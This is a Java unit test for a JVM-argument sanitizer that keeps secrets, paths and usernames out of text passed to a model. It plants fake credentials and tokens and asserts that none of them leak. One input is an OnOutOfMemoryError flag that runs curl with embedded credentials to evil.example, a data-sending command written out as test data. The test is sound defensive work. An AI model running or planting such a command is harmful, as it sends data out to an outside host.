package jfrdoc.tools;

import java.util.ArrayList;
import java.util.List;

/**
 * Unit tests for {@link JvmArguments}, run by test/unit.sh. The point of the
 * class is that no value from a JVM command line reaches the model unless
 * it's plainly a number, so these tests plant secrets and paths in every
 * shape and assert none survive.
 */
public final class JvmArgumentsTest {

    private static final List<String> failures = new ArrayList<>();
    private static int passed;

    public static void main(String[] args) {
        String jvmArgs = String.join(" ",
                "-Xmx512m", "-Xss256k", "-Xms1G",
                "-XX:+UseG1GC", "-XX:-UseCompressedOops", "-XX:MaxRAMPercentage=75.0",
                "-XX:ActiveProcessorCount=2", "-XX:MaxMetaspaceSize=256m",
                "-XX:NativeMemoryTracking=summary", "-XX:NativeMemoryTracking=hunter2",
                "-XX:HeapDumpPath=/home/alice/dumps",
                "-XX:OnOutOfMemoryError=curl https://bob:hunter2@evil.example/x -d %p",
                "-XX:StartFlightRecording=filename=/Users/carol/rec.jfr,settings=profile",
                "-Dspring.datasource.password=hunter2",
                "-Ddb.url=jdbc:postgresql://dave:s3cret@db.internal/prod",
                "-Dplain",
                "-javaagent:/opt/otel/opentelemetry-javaagent.jar=otel.exporter.otlp.headers=api-key=sk-live-123",
                "-agentpath:C:\\Users\\erin\\yourkit\\libyjpagent.so=port=10001",
                "-agentlib:jdwp=transport=dt_socket,address=5005",
                "-cp", "/home/alice/app.jar:/lib/x.jar",
                "--add-opens", "java.base/java.lang=ALL-UNNAMED",
                "-Xlog:gc*:file=/tmp/gc.log",
                "-verbose:gc",
                "--token=ghp_abcdef",
                "-Dcmd=mysql", "-u", "root", "-pS3cretPass", "--password", "-Xsecretish");

        var flags = JvmArguments.jvmFlags(jvmArgs).toString();
        expect(flags, List.of(
                "-Xmx512m", "-Xss256k", "-Xms1G",
                "-XX:+UseG1GC", "-XX:-UseCompressedOops", "-XX:MaxRAMPercentage=75.0",
                "-XX:ActiveProcessorCount=2", "-XX:MaxMetaspaceSize=256m",
                "-XX:NativeMemoryTracking=summary", "-XX:NativeMemoryTracking=<omitted>",
                "-XX:HeapDumpPath=<omitted>",
                "-XX:OnOutOfMemoryError=<omitted>",
                "-XX:StartFlightRecording=<omitted>",
                "-Dspring.datasource.password",
                "-Ddb.url",
                "-Dplain",
                "-javaagent:opentelemetry-javaagent.jar",
                "-agentpath:libyjpagent.so",
                "-agentlib:jdwp",
                "-cp",
                "--add-opens",
                "-Xlog:<omitted>",
                "-verbose:<omitted>",
                "-Dcmd"));

        for (String secret : List.of("hunter2", "s3cret", "sk-live", "ghp_", "alice", "bob", "carol", "dave",
                "erin", "evil.example", "db.internal", "5005", "10001", "/opt", "/lib", "/tmp", "ALL-UNNAMED", "S3cret", "root",
                "ghp", "secretish", "--password")) {
            check(!flags.contains(secret), "jvmFlags leaks nothing containing '" + secret + "'");
        }

        check(JvmArguments.jvmFlags(null).toString().equals("[]"), "null jvmArguments -> empty list");
        check(JvmArguments.jvmFlags("   ").toString().equals("[]"), "blank jvmArguments -> empty list");

        String javaArgs = "/home/alice/apps/petclinic.jar --spring.datasource.password=hunter2 extra";
        check("petclinic.jar".equals(JvmArguments.mainClassOrJar(javaArgs)), "main jar reduced to its file name");
        check(JvmArguments.programArgumentCount(javaArgs) == 2, "program arguments are counted, not shown");
        check("com.example.Main".equals(JvmArguments.mainClassOrJar("com.example.Main --password x")),
                "main class kept as-is");
        check(JvmArguments.mainClassOrJar("") == null, "empty javaArguments -> no main");
        check(JvmArguments.mainClassOrJar(null) == null, "null javaArguments -> no main");
        check(JvmArguments.mainClassOrJar("C:\\Users\\erin\\my app\\run.jar") == null,
                "a main path split by spaces yields nothing rather than a fragment");
        check(JvmArguments.mainClassOrJar("/home/jane doe/app.jar") == null,
                "a split home-directory path doesn't surface the username");
        check("run.JAR".equals(JvmArguments.mainClassOrJar("C:\\apps\\run.JAR x")),
                "Windows jar path reduced to its file name");

        if (!failures.isEmpty()) {
            System.err.println(failures.size() + " JvmArguments test(s) failed:");
            failures.forEach(f -> System.err.println("  " + f));
            System.exit(1);
        }
        System.out.println("JvmArgumentsTest: all " + passed + " checks passed.");
    }

    static void expect(String actualJson, List<String> expected) {
        var sb = new StringBuilder("[");
        for (int i = 0; i < expected.size(); i++) {
            if (i > 0) sb.append(',');
            sb.append('"').append(expected.get(i).replace("\\", "\\\\")).append('"');
        }
        String expectedJson = sb.append(']').toString();
        check(actualJson.equals(expectedJson), "jvmFlags allowlist\n    expected " + expectedJson + "\n    got      " + actualJson);
    }

    static void check(boolean ok, String label) {
        if (ok) {
            passed++;
        } else {
            failures.add(label);
        }
    }
}
